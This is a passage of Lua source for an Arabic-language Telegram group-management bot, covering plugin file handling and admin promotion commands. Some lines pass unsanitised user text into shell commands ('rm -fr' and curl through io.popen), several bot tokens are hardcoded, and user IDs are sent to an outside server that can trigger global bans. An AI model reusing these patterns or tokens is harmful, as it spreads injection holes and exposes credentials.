send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر]((t.me/SNIEBR_files))', 1, 'md')
end
end
if text:match("^(تعطيل ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
end
if (text:match("^(مسح جميع الملفات)$"))then
datahmade:del("files"..bot_id)
send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
end
if text:match("^(حذف ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
end
if (msg.content_.text_ == 'اضف ملف' ) then
send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
datahmade:set("addfiel"..msg.sender_user_id_,"yes")
end
if text:match("^(جلب ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(جلب ملف) (.*)(.lua)$")}
send(msg.chat_id_, msg.id_, 1, "🕡┇ انتظر بعض الوقت وسيتم جلب \n 📁┇ملف : {"..name_t[2]..".lua}", 1, 'html')
local SNIEBRe = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. SNIEBRe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_SNIEBR/'..name_t[2]..'.lua' .. '"'
io.popen(curl)
end
end
end -- end if sudo
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if text then
if (text and text == 'تفعيل الانلاين' ) then
datahmade:set('key_ts'..bot_id,"yes")
send(msg.chat_id_, msg.id_, 1, "☑┇تم تفعيل خاصيه الازرار الشفافه", 1, 'html')
end
if (text and text == 'تعطيل الانلاين') then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
datahmade:del('key_ts'..bot_id)
send(msg.chat_id_, msg.id_, 1, "⚠┇تم تعطيل خاصيه الازرار الشفافه", 1, 'html')
end
if text:match("^(تغير نص الانلاين) (.*)$") then
local name_t = {string.match(text, "^(تغير نص الانلاين) (.*)$")}
datahmade:set("channel_ts"..bot_id, name_t[2])
send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير النص ~⪼ {"..name_t[2].."}", 1, 'html')
end

if text:match("^(تغير رابط الانلاين) [Hh][Tt][Tt][Pp](.*)$") then
local name_t = {string.match(text, "^(تغير رابط الانلاين) (.*)$")}
datahmade:set("channel_user_ts"..bot_id, name_t[2])
send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير الرابط ~⪼ {"..name_t[2].."}", 1, 'html')
end
end

end --sudo
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if text == 'تفعيل البوت خدمي'then
datahmade:set("add"..bot_id, "yes")
send(msg.chat_id_, msg.id_, 1, "☑┇تم تفعيل البوت خدمي", 1, 'html')
end
if (text == 'تعطيل البوت خدمي') then
datahmade:del("add"..bot_id)
send(msg.chat_id_, msg.id_, 1, "❎┇تم تعطيل البوت خدمي", 1, 'html')
end
if text:match("^(تعين عدد الاعضاء) (.*)$") then
local kekoj = {string.match(text, "^(تعين عدد الاعضاء) (.*)$")}
datahmade:set("ts_a"..bot_id,kekoj[2])
send(msg.chat_id_, msg.id_, 1, "🔘┇ تم تعين : "..kekoj[2], 1, 'html')
end
end
end
end -- end function sudo

function SNIEBR_run_file(data)
local files_SNIEBR = datahmade:smembers("files"..bot_id)
for i=1,#files_SNIEBR do
local SNIEBRee = dofile("files_SNIEBR/"..files_SNIEBR[i])
local kt = SNIEBRee.keko_SNIEBR(data)
if kt == 'end' then
return false
end
end
end

function TSall(msg,data)
text = msg.content_.text_
if msg.content_.photo_ then
local photo = datahmade:get('SNIEBR:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
if photo then
local idPh = nil
if msg.content_.photo_.sizes_[0] then
idPh = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
idPh = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
idPh = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[3] then
idPh = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
setphoto(msg.chat_id_, idPh)
send(msg.chat_id_, msg.id_, 1, '🎴┇ تم وضع صوره للمجموعة ', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
end end
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
if msg.date_ < (os.time() - 30) then
return false end
if text then
-------------------------------------------
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return false
end
if not datahmade:get( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
if datahmade:get( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_) then
datahmade:del( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_)
for k,v in pairs(sudo_users) do
end
end
end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if not datahmade:sismember( 'SNIEBR:'..bot_id.."groups",msg.chat_id_) then
datahmade:sadd( 'SNIEBR:'..bot_id.."groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
datahmade:sadd('SNIEBR:'..bot_id.."userss",msg.chat_id_)
else
if not datahmade:sismember( 'SNIEBR:'..bot_id.."groups",msg.chat_id_) then
datahmade:sadd( 'SNIEBR:'..bot_id.."groups",msg.chat_id_)
end
end
end
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
datahmade:incr('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
if datahmade:get('SNIEBR:'..bot_id..'viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
send(msg.chat_id_, msg.id_, 1, '❕┇قم بارسال المنشور من القناة', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'viewget'..msg.sender_user_id_)
else
send(msg.chat_id_, msg.id_, 1, '📊┇عدد المشاهدات ~⪼ <b>('..msg.views_..')</b> ', 1, 'html')
datahmade:del('SNIEBR:'..bot_id..'viewget'..msg.sender_user_id_)
end
end
if msg.content_.members_ then
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
if (text and (is_creator(msg) or is_creatorbasic(msg))) then
if text and text:match("اضف امر (.*)") then 
local SNIEBR_edis = {string.match(text, "^اضف امر (.*)$")}
send(msg.chat_id_, msg.id_, 1, "☑┇ ارسال الان الامر الجديد", 1, 'md')
datahmade:set("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id,SNIEBR_edis[1])
datahmade:sadd('SNIEBR:'..bot_id..'SNIEBRnwe:'..msg.chat_id_,SNIEBR_edis[1])
elseif (datahmade:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id)) then 
send(msg.chat_id_, msg.id_, 1, "☑┇ تم الحفظ بنجاح", 1, 'md')
datahmade:set("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..datahmade:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
datahmade:set("SNIEBR:edit:text:su:newamr2:"..bot_id..msg.chat_id_..text,datahmade:get("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id))
datahmade:del("tsahke:new:msg:amr:"..msg.chat_id_..msg.sender_user_id_..bot_id)
end  
if text and text:match("^مسح امر (.*)") then 
local t = {string.match(text, "^مسح امر (.*)$")}
local klma = datahmade:get("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..t[1])
if klma ~= nil then
datahmade:del("SNIEBR:edit:text:su:newamr2:"..bot_id..msg.chat_id_..klma)
datahmade:del("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..t[1])
datahmade:srem('SNIEBR:'..bot_id..'SNIEBRnwe:'..msg.chat_id_,klma)
send(msg.chat_id_, msg.id_, 1, "☑┇ تم المسح بنجاح", 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, "☑┇ عذرآ لا يوجد امر بهاذا الاسم", 1, 'md')
end
end
if text == 'الاوامر الاضافيه' then
local list = datahmade:smembers('SNIEBR:'..bot_id..'SNIEBRnwe:'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_, 1,'🔖┇لا توجد اوامر مضافه', 'html')
return false
end
t = '📝┇قائمه الاوامر المضافه هنا\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
for k,v in pairs(list) do
var = datahmade:get("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
if var then
t = t..''..k..'- '..v..' » ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_, 1,t, 'html')
end

if text == 'مسح الاوامر المضافه' then 
local list = datahmade:smembers('SNIEBR:'..bot_id..'SNIEBRnwe:'..msg.chat_id_)
for k,v in pairs(list) do
local klma = datahmade:get("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
if klma ~= nil then
datahmade:del("SNIEBR:edit:text:su:newamr2:"..bot_id..msg.chat_id_..klma)
datahmade:del("SNIEBR:edit:text:su:newamr:"..bot_id..msg.chat_id_..v)
end
end
datahmade:del('SNIEBR:'..bot_id..'SNIEBRnwe:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1,"📛┇تم مسح الاوامر جميعها", 'md')
end

if (text and text == 'مسح امر المطور بالكليشه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('SNIEBR:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الكليشه ', 1, 'html')
return "SNIEBR"
end
end

if text == "رفع منشئ" and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function setcreator_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔖┇تم بالفعل رفعة منشئ  في البوت")
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"🔖┇تم بالفعل رفعة منشئ  في البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setcreator_by_reply)
end
if text:match("^رفع منشئ @(.*)$") and is_creatorbasic(msg) then
local apow = {string.match(text, "^(رفع منشئ) @(.*)$")}
function setcreator_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'SNIEBR')..')\n🔖┇تم رفعة منشئ  في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apow[2],setcreator_by_username)
end
if text:match("^رفع منشئ (%d+)$") and is_creatorbasic(msg) then
local apow = {string.match(text, "^(رفع منشئ) (%d+)$")}
datahmade:sadd('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, apow[2])
tsX000(apow[2],msg,"🔖┇تم رفعة منشئ  في البوت")
end
if text:match("^تنزيل منشئ$") and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function decreator_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من منشئين المجموعه")
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"🔰┇تم تنزيله من منشئين المجموعه")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,decreator_by_reply)
end
if text:match("^تنزيل منشئ @(.*)$") and is_creatorbasic(msg) then
local apow = {string.match(text, "^(تنزيل منشئ) @(.*)$")}
local hash =  'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
function remcreator_by_username(extra, result, success)
if result.id_ then
datahmade:srem(hash, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'SNIEBR')..')\n🔰┇تم تنزيله من منشئين المجموعه'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apow[2],remcreator_by_username)
end
if text:match("^تنزيل منشئ (%d+)$") and is_creatorbasic(msg) then
local hash =  'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
local apow = {string.match(text, "^(تنزيل منشئ) (%d+)$")}
datahmade:srem(hash, apow[2])
tsX000(apow[2],msg,"🔰┇تم تنزيله من منشئين المجموعه")
end--
if text == 'المنشئين الاساسين' and is_sudo(msg) then
local list = datahmade:smembers('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_)
if #list == 0 then
text = "❗️┇ لا يوجد منشئين اساسين "
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
return false
end
text = "🛅┇قائمة المنشئين الاساسيين ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
return false
end
if text == ("المنشئين") and is_creatorbasic(msg) then
local hash =   'SNIEBR:'..bot_id..'creator:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "🛅┇قائمة المنشئين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️┇ لا يوجد منشئين  "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------
if text:match("^رفع ادمن بالكروب (%d+)$") and  is_creatorbasic(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن بالكروب) (%d+)$")}
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
tsX000(apmd[2],msg,'🔖┇تم رفعة ادمن   في الكروب')
end
if text:match("^رفع ادمن بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
tsX000("prore",msg,'🔖┇تم رفعة ادمن   في الكروب')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع ادمن بالكروب @(.*)$") and is_creatorbasic(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔖┇تم رفعة ادمن   في الكروب  '
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
--------------------------------------
-------------------------------------
if text:match("^رفع منشئ بالكروب (%d+)$") and  is_creatorbasic(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ بالكروب) (%d+)$")}
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
tsX000(apmd[2],msg,'🔖┇تم رفعة منشئ   في الكروب')
end
if text:match("^رفع منشئ بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
tsX000("prore",msg,'🔖┇تم رفعة منشئ في الكروب')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع منشئ بالكروب @(.*)$") and is_creatorbasic(msg) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔖┇تم رفعة منشئ   في الكروب'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
----------------------------------
if text:match("^تنزيل ادمن بالكروب (%d+)$") and  is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل ادمن بالكروب) (%d+)$")}
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
tsX000(apmd[2],msg,'🔰┇تم تنزيله ادمن   في الكروب')
end
if text:match("^تنزيل ادمن بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
tsX000("prore",msg,'🔰┇تم تنزيله ادمن   في الكروب')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب @(.*)$") and is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل ادمن بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔰┇تم تنزيله ادمن   في الكروب'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
---------------------------------------
-------------------------------------
if text:match("^تنزيل منشئ بالكروب (%d+)$") and  is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل منشئ بالكروب) (%d+)$")}
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
tsX000(apmd[2],msg,'🔰┇تم تنزيله منشئ   في الكروب')
end
if text:match("^تنزيل منشئ بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
tsX000("prore",msg,'🔰┇تم تنزيله منشئ   في الكروب')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل منشئ بالكروب @(.*)$") and is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل منشئ بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔰┇تم تنزيله منشئ   في الكروب'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
return false
end
if text:match("^رفع ادمن$")  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
